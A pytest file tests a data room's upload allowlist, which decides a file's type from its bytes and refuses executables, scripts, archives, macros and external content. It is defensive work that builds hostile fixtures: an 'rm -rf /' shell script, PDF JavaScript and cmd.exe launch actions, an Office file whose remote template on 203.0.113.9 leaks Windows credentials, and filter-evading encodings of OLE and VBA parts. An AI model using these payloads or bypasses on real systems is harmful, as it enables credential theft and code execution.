"""The data room's type allowlist (`services/projects/data_room_files.py`): the type comes from the
bytes, never the name; programs, scripts, archives, macros and legacy Office files are refused; a
name is cleaned and always ends in its type's extension."""

from __future__ import annotations

import io
import zipfile
from collections.abc import Callable

import pytest

from services.projects import data_room_files as files
from services.projects import models as pm

MIB = 1024 * 1024
CAP = 25 * MIB

PDF = b"%PDF-1.7\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\ntrailer\n<< /Root 1 0 R >>\n%%EOF\n"
PNG = b"\x89PNG\r\n\x1a\n" + b"\x00" * 64
JPEG = b"\xff\xd8\xff\xe0" + b"\x00" * 64
TIFF = b"II*\x00" + b"\x00" * 64

_MAIN = {
    "docx": (
        "word/document.xml",
        "application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml",
    ),
    "xlsx": ("xl/workbook.xml", "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"),
    "pptx": (
        "ppt/presentation.xml",
        "application/vnd.openxmlformats-officedocument.presentationml.presentation.main+xml",
    ),
}


CT_NS = "http://schemas.openxmlformats.org/package/2006/content-types"
RELS_NS = "http://schemas.openxmlformats.org/package/2006/relationships"
R = "http://schemas.openxmlformats.org/officeDocument/2006/relationships"
DOCX_MAIN = _MAIN["docx"][1]


def content_types(*entries: str) -> str:
    return (
        f'<?xml version="1.0" encoding="UTF-8"?><Types xmlns="{CT_NS}">'
        '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
        '<Default Extension="xml" ContentType="application/xml"/>' + "".join(entries) + "</Types>"
    )


def rels(*entries: str) -> str:
    return (
        f'<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns="{RELS_NS}">'
        + "".join(entries)
        + "</Relationships>"
    )


def package_rels(target: str) -> str:
    return rels(f'<Relationship Id="rId1" Type="{R}/officeDocument" Target="{target}"/>')


def package(types: str, parts: dict[str, str | bytes]) -> bytes:
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as archive:
        archive.writestr(_entry("[Content_Types].xml"), types, zipfile.ZIP_DEFLATED)
        for name, data in parts.items():
            archive.writestr(_entry(name), data, zipfile.ZIP_DEFLATED)
    return buffer.getvalue()


def _entry(name: str) -> zipfile.ZipInfo:
    """A member with a fixed timestamp, so a package's bytes (and the test ids parametrised on them)
    are the same on every pytest-xdist worker; the clock's second used to differ between workers."""
    return zipfile.ZipInfo(name, date_time=(2026, 10, 23, 0, 0, 0))


def ooxml(
    kind: str,
    *,
    extra: dict[str, str | bytes] | None = None,
    content_type: str | None = None,
    overrides: tuple[str, ...] = (),
) -> bytes:
    """A minimal package of the format: `[Content_Types].xml`, the package relationship to the main
    part (as every Office file has), the main part, and `extra` parts."""
    part, main = _MAIN[kind]
    types = content_types(f'<Override PartName="/{part}" ContentType="{content_type or main}"/>', *overrides)
    return package(types, {"_rels/.rels": package_rels(part), part: "<x/>", **(extra or {})})


def docx_with(document_rels: str, *, overrides: tuple[str, ...] = (), **parts: str | bytes) -> bytes:
    """A .docx whose main part has these relationships (`word/_rels/document.xml.rels`)."""
    return ooxml(
        "docx",
        overrides=overrides,
        extra={"word/_rels/document.xml.rels": rels(document_rels), **parts},
    )


# The three files of the 2026-10-23 review, each accepted before (and the third stored by the API).
def ole_object_by_character_reference() -> bytes:
    """An embedded OLE object at a part name no pattern matches, its content type written with a
    character reference, and an `oleObject` relationship to it."""
    return docx_with(
        f'<Relationship Id="rId9" Type="{R}/oleObject" Target="media/image9.bin"/>',
        overrides=(
            '<Override PartName="/word/media/image9.bin" '
            'ContentType="application/vnd.openxmlformats-officedocument.ole&#79;bject"/>',
        ),
        **{"word/media/image9.bin": b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 64},
    )


def remote_template() -> bytes:
    """A plain .docx whose settings attach a template on a network share: opening it fetches the
    template and hands over the user's Windows credentials, with no macro in the file."""
    return ooxml(
        "docx",
        overrides=(
            '<Override PartName="/word/settings.xml" '
            'ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.settings+xml"/>',
        ),
        extra={
            "word/_rels/document.xml.rels": rels(
                f'<Relationship Id="rId1" Type="{R}/settings" Target="settings.xml"/>'
            ),
            "word/settings.xml": "<w:settings/>",
            "word/_rels/settings.xml.rels": rels(
                f'<Relationship Id="rId1" Type="{R}/attachedTemplate" '
                'Target="file://\\\\203.0.113.9\\share\\t.dotm" TargetMode="External"/>'
            ),
        },
    )


def macros_by_character_reference() -> bytes:
    """A macro-enabled main part and a VBA project, both written with character references, with the
    plain .docx main type in an XML comment."""
    types = content_types(
        f'<!-- ContentType="{DOCX_MAIN}" -->',
        '<Override PartName="/word/document.xml" '
        'ContentType="application/vnd.ms-word.document.macro&#69;nabled.main+xml"/>',
        '<Override PartName="/word/media/data.bin" ContentType="application/vnd.ms-office.vba&#80;roject"/>',
    )
    return package(
        types,
        {
            "_rels/.rels": package_rels("word/document.xml"),
            "word/document.xml": "<w:document/>",
            "word/_rels/document.xml.rels": rels(
                '<Relationship Id="rId5" '
                'Type="http://schemas.microsoft.com/office/2006/relationships/vba&#80;roject" '
                'Target="media/data.bin"/>'
            ),
            "word/media/data.bin": b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 64,
        },
    )


def plain_zip() -> bytes:
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w") as archive:
        archive.writestr(_entry("readme.txt"), "hello")
    return buffer.getvalue()


def test_the_allowlist_is_the_models_vocabulary() -> None:
    assert tuple(files.TYPES) == pm.DOCUMENT_TYPES
    assert set(files.REFUSAL_TEXT) == set(pm.REFUSAL_REASONS)


@pytest.mark.parametrize(
    ("data", "name", "expected"),
    [
        (PDF, "permit.pdf", "pdf"),
        (b"\xef\xbb\xbf" + PDF, "permit.pdf", "pdf"),  # a header within the first 1,024 bytes
        (ooxml("docx"), "lease.docx", "docx"),
        (ooxml("xlsx"), "model.xlsx", "xlsx"),
        (ooxml("pptx"), "deck.pptx", "pptx"),
        (PNG, "site.png", "png"),
        (JPEG, "site.jpg", "jpeg"),
        (TIFF, "scan.tif", "tiff"),
        (b"name,mw\nNorth Ridge,200\n", "queue.csv", "csv"),
        (b"\xef\xbb\xbfplain notes\twith a tab\r\n", "notes.txt", "txt"),
    ],
)
def test_accepted_types_are_read_from_the_bytes(data: bytes, name: str, expected: str) -> None:
    verdict = files.inspect_upload(data, name, max_bytes=CAP)
    assert isinstance(verdict, files.Accepted), verdict
    assert verdict.doc_type.key == expected


def test_the_name_never_decides_the_type() -> None:
    # A PDF called .docx is a PDF; it keeps its name and gains the type's own extension.
    verdict = files.inspect_upload(PDF, "report.docx", max_bytes=CAP)
    assert isinstance(verdict, files.Accepted)
    assert verdict.doc_type.key == "pdf" and verdict.file_name == "report.docx.pdf"
    # A program called .pdf is still a program.
    assert files.inspect_upload(b"MZ\x90\x00" + b"\x00" * 100, "invoice.pdf", max_bytes=CAP) == files.Refusal(
        "executable"
    )


@pytest.mark.parametrize(
    ("data", "name", "reason"),
    [
        (b"", "empty.pdf", "empty"),
        (b"MZ\x90\x00" + b"\x00" * 60, "setup.exe", "executable"),
        (b"\x7fELF\x02\x01\x01" + b"\x00" * 60, "tool", "executable"),
        (b"\xcf\xfa\xed\xfe" + b"\x00" * 60, "app", "executable"),
        (b"\xca\xfe\xba\xbe" + b"\x00" * 60, "Main.class", "executable"),
        (b"#!/bin/sh\nrm -rf /\n", "install.sh", "script"),
        (b"#!/usr/bin/env python\nprint(1)\n", "notes.txt", "script"),
        (b"alert(document.cookie)\n", "x.js", "type_not_accepted"),
        (b"<html><script>alert(1)</script></html>", "page.html", "type_not_accepted"),
        (
            b"<svg xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>",
            "a.txt",
            "type_not_accepted",
        ),
        (b"{\\rtf1\\ansi hello}", "letter.txt", "type_not_accepted"),
        (b"plain text\x00with a nul", "notes.txt", "type_not_accepted"),
        (b"\xff\xfe\x00\x00not utf-8", "notes.csv", "type_not_accepted"),
        (plain_zip(), "bundle.zip", "archive"),
        (b"Rar!\x1a\x07\x00" + b"\x00" * 40, "a.rar", "archive"),
        (b"7z\xbc\xaf\x27\x1c" + b"\x00" * 40, "a.7z", "archive"),
        (b"\x1f\x8b\x08\x00" + b"\x00" * 40, "a.gz", "archive"),
        (b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 100, "old.doc", "legacy_office"),
        (PDF + plain_zip(), "polyglot.pdf", "archive"),
        (
            PDF.replace(
                b"/Type /Catalog", b"/Type /Catalog /OpenAction << /S /JavaScript /JS (app.alert(1)) >>"
            ),
            "form.pdf",
            "script",
        ),
        (
            PDF.replace(b"/Type /Catalog", b"/Type /Catalog /AA << /O << /S /J#61vaScript >> >>"),
            "x.pdf",
            "script",
        ),
        (
            PDF.replace(b"/Type /Catalog", b"/Type /Catalog /OpenAction << /S /Launch /F (cmd.exe) >>"),
            "x.pdf",
            "script",
        ),
        (
            PDF.replace(b"/Type /Catalog", b"/Type /Catalog /Names << /EmbeddedFiles 3 0 R >>"),
            "x.pdf",
            "script",
        ),
        (
            ooxml("docx", content_type="application/vnd.ms-word.document.macroEnabled.main+xml"),
            "m.docm",
            "macros",
        ),
        (ooxml("xlsx", extra={"xl/vbaProject.bin": b"\x00" * 16}), "m.xlsx", "macros"),
        (ooxml("docx", extra={"word/activeX/activeX1.xml": b"<x/>"}), "a.docx", "macros"),
        (ooxml("pptx", extra={"ppt/embeddings/oleObject1.bin": b"\x00" * 16}), "e.pptx", "macros"),
        (
            ooxml(
                "docx",
                content_type="application/vnd.openxmlformats-officedocument.wordprocessingml.template.main+xml",
            ),
            "t.dotx",
            "type_not_accepted",
        ),
        (b"%%%% random binary \x00\x01\x02", "blob.bin", "type_not_accepted"),
    ],
)
def test_refusals(data: bytes, name: str, reason: str) -> None:
    assert files.inspect_upload(data, name, max_bytes=CAP) == files.Refusal(reason)
    assert files.Refusal(reason).text  # every refusal says why, in words


@pytest.mark.parametrize(
    ("build", "reason"),
    [
        (ole_object_by_character_reference, "macros"),
        (remote_template, "external_content"),
        (macros_by_character_reference, "macros"),
    ],
)
def test_the_reviewed_office_bypasses_are_refused(build: Callable[[], bytes], reason: str) -> None:
    assert files.inspect_upload(build(), "x.docm.docx", max_bytes=CAP) == files.Refusal(reason)


@pytest.mark.parametrize(
    ("data", "reason"),
    [
        # Relationship types that are active content, however their URI is spelled.
        (docx_with(f'<Relationship Id="r" Type="{R}/package" Target="media/a.xlsx"/>'), "macros"),
        (docx_with(f'<Relationship Id="r" Type="{R}/aFChunk" Target="chunk.mht"/>'), "macros"),
        (docx_with(f'<Relationship Id="r" Type="{R}/control" Target="activeX1.xml"/>'), "macros"),
        (
            docx_with(
                '<Relationship Id="r" Type="http://schemas.microsoft.com/office/2006/relationships/'
                'activeXControlBinary" Target="media/x.bin"/>'
            ),
            "macros",
        ),
        (docx_with(f'<Relationship Id="r" Type="{R}/ole%4Fbject" Target="media/x.bin"/>'), "macros"),
        # Content types that are active content or a whole document inside this one.
        (
            ooxml(
                "pptx",
                overrides=(
                    '<Override PartName="/ppt/media/book.bin" '
                    'ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"/>',
                ),
            ),
            "macros",
        ),
        (
            ooxml(
                "xlsx",
                overrides=('<Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/>',),
            ),
            "macros",
        ),
        (
            ooxml(
                "docx",
                overrides=(
                    '<Override xmlns:x="urn:x" PartName="/word/x.xml" ContentType="application/xml" '
                    'x:ContentType="application/vnd.ms-office.activeX+xml"/>',
                ),
            ),
            "macros",
        ),
        # A part name with a percent-escape is the part it decodes to.
        (ooxml("docx", extra={"word/vba%50roject.bin": b"\x00" * 16}), "macros"),
        # Anything that loads from outside the file when opened, but a hyperlink.
        (
            docx_with(
                f'<Relationship Id="r" Type="{R}/image" Target="https://203.0.113.9/p.png" '
                'TargetMode="External"/>'
            ),
            "external_content",
        ),
        (
            docx_with(f'<Relationship Id="r" Type="{R}/image" Target="\\\\203.0.113.9\\s\\p.png"/>'),
            "external_content",
        ),
        (
            docx_with(
                f'<Relationship Id="r" Type="{R}/frame" Target="https://203.0.113.9/" TargetMode="external"/>'
            ),
            "external_content",
        ),
        (
            docx_with(
                f'<Relationship Id="r" Type="{R}/attached&#84;emplate" Target="t.dotm" '
                'TargetMode="External"/>'
            ),
            "external_content",
        ),
        (
            ooxml(
                "xlsx",
                extra={
                    "xl/_rels/workbook.xml.rels": rels(
                        f'<Relationship Id="r" Type="{R}/externalLink" '
                        'Target="externalLinks/externalLink1.xml"/>'
                    ),
                    "xl/externalLinks/externalLink1.xml": (
                        '<externalLink><ddeLink ddeService="cmd"/></externalLink>'
                    ),
                },
            ),
            "external_content",
        ),
    ],
    ids=[
        "package-relationship",
        "afchunk-relationship",
        "activex-control-relationship",
        "activex-binary-relationship",
        "percent-escaped-ole-relationship",
        "embedded-workbook-content-type",
        "vba-default-content-type",
        "prefixed-activex-content-type",
        "percent-escaped-vba-part-name",
        "external-picture",
        "network-path-picture",
        "external-frame-lower-case-mode",
        "attached-template-by-character-reference",
        "link-to-another-workbook",
    ],
)
def test_active_and_external_office_content_is_refused(data: bytes, reason: str) -> None:
    assert files.inspect_upload(data, "x.docx", max_bytes=CAP) == files.Refusal(reason)


def test_a_hyperlink_may_point_outside_the_file() -> None:
    data = docx_with(
        f'<Relationship Id="r" Type="{R}/hyperlink" Target="https://example.org/" TargetMode="External"/>'
    )
    verdict = files.inspect_upload(data, "links.docx", max_bytes=CAP)
    assert isinstance(verdict, files.Accepted) and verdict.doc_type.key == "docx"


_ENTITIES = (
    '<?xml version="1.0"?><!DOCTYPE Types [<!ENTITY a "aaaaaaaaaa"><!ENTITY b "&a;&a;&a;&a;&a;">]>'
    f'<Types xmlns="{CT_NS}"><Override PartName="/word/document.xml" ContentType="{DOCX_MAIN}&b;"/></Types>'
)


@pytest.mark.parametrize(
    "data",
    [
        # The format comes from the part the package's officeDocument relationship names, only.
        package(
            content_types(f'<Override PartName="/word/document.xml" ContentType="{DOCX_MAIN}"/>'),
            {"word/document.xml": "<x/>"},
        ),
        package(
            content_types(f'<Override PartName="/word/document.xml" ContentType="{DOCX_MAIN}"/>'),
            {"_rels/.rels": package_rels("word/missing.xml"), "word/document.xml": "<x/>"},
        ),
        package(
            content_types(f"<!-- {DOCX_MAIN} -->"),
            {"_rels/.rels": package_rels("word/document.xml"), "word/document.xml": "<x/>"},
        ),
        package(
            content_types(f'<Override PartName="/word/document.xml" ContentType="{DOCX_MAIN}"/>'),
            {
                "_rels/.rels": rels(
                    f'<Relationship Id="a" Type="{R}/officeDocument" Target="word/document.xml"/>',
                    f'<Relationship Id="b" Type="{R}/officeDocument" Target="word/other.xml"/>',
                ),
                "word/document.xml": "<x/>",
                "word/other.xml": "<x/>",
            },
        ),
        # A DTD, an entity, XML that is not well-formed, two entries or overrides for one part.
        package(_ENTITIES, {"_rels/.rels": package_rels("word/document.xml"), "word/document.xml": "<x/>"}),
        ooxml("docx", extra={"word/_rels/document.xml.rels": "<Relationships><Relationship"}),
        ooxml("docx", extra={"Word/Document.xml": "<y/>"}),
        ooxml(
            "docx",
            overrides=(
                '<Override PartName="/WORD/document.xml" '
                'ContentType="application/vnd.ms-word.document.main+xml"/>',
            ),
        ),
    ],
    ids=[
        "no-package-relationship",
        "main-part-missing",
        "main-type-only-in-a-comment",
        "two-main-parts",
        "dtd-and-entities",
        "malformed-relationships",
        "two-entries-one-part",
        "two-overrides-one-part",
    ],
)
def test_a_package_that_is_not_plainly_one_format_is_refused(data: bytes) -> None:
    assert files.inspect_upload(data, "x.docx", max_bytes=CAP) == files.Refusal("type_not_accepted")


def test_relationships_parts_are_bounded() -> None:
    huge = rels(
        *(f'<Relationship Id="r{i}" Type="{R}/image" Target="media/{i}.png"/>' for i in range(30_000))
    )
    assert len(huge) > 1024 * 1024
    data = ooxml("docx", extra={"word/_rels/document.xml.rels": huge})
    assert files.inspect_upload(data, "x.docx", max_bytes=CAP) == files.Refusal("type_not_accepted")


def test_an_encrypted_zip_entry_is_refused() -> None:
    data = bytearray(ooxml("docx"))
    # Set the "encrypted" flag on the first local header and its central directory entry.
    data[6] |= 0x1
    central = data.find(b"PK\x01\x02")
    data[central + 8] |= 0x1
    assert files.inspect_upload(bytes(data), "locked.docx", max_bytes=CAP) == files.Refusal("encrypted")


def test_the_size_cap_is_checked_on_the_file() -> None:
    big = b"%PDF-1.7\n" + b"0" * (2 * MIB)
    assert files.inspect_upload(big, "big.pdf", max_bytes=MIB) == files.Refusal("too_large")
    assert isinstance(files.inspect_upload(big, "big.pdf", max_bytes=3 * MIB), files.Accepted)


@pytest.mark.parametrize(
    ("raw", "expected"),
    [
        ("C:\\Users\\me\\Desktop\\Site lease.pdf", "Site lease.pdf"),
        ("../../etc/passwd.pdf", "passwd.pdf"),
        ("invoice\u202efdp.exe", "invoicefdp.exe.pdf"),  # a right-to-left override cannot hide the type
        ("  spaced   out  .pdf", "spaced out .pdf"),
        ("tab\tand\nnewline.pdf", "tab and newline.pdf"),
        ("", "document.pdf"),
        ("...", "document.pdf"),
        ("Report.PDF", "Report.PDF"),
        ("café.pdf", "café.pdf"),
    ],
)
def test_names_are_cleaned_and_keep_their_types_extension(raw: str, expected: str) -> None:
    assert files.clean_file_name(raw, files.TYPES["pdf"]) == expected


def test_a_long_name_is_shortened_and_keeps_its_extension() -> None:
    name = files.clean_file_name("x" * 400 + ".pdf", files.TYPES["pdf"])
    assert len(name) <= pm.FILE_NAME_MAX_CHARS and name.endswith(".pdf") and "…" in name


def test_a_text_file_needs_a_text_name() -> None:
    assert isinstance(files.inspect_upload(b"a,b\n1,2\n", "data.csv", max_bytes=CAP), files.Accepted)
    assert files.inspect_upload(b"a,b\n1,2\n", "data.py", max_bytes=CAP) == files.Refusal("type_not_accepted")
    assert files.inspect_upload(b"a,b\n1,2\n", "data", max_bytes=CAP) == files.Refusal("type_not_accepted")


def test_accepted_types_list_for_the_page() -> None:
    listed = files.accepted_types()
    assert [row["type"] for row in listed] == list(pm.DOCUMENT_TYPES)
    assert all(row["label"] and row["extensions"] for row in listed)
